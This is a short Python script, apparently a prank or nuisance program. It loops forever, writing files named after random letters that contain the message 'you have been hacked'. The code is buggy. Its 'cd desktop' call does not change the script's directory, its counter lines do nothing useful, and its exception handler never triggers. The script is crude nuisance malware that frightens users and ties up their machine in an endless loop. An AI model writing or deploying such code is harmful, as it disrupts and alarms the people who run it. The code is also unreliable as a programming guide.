import subprocess
import time
import random
import string

subprocess.getoutput("cd desktop")
i = 1
while True:
    i = +1
    try:
        i = +1
        letters = string.ascii_lowercase
        awd = random.choices(letters)
        file = open(f"{awd}.txt", "w")
        file.write("you have been hacked")
        file.close()
    except FileExistsError:
        pass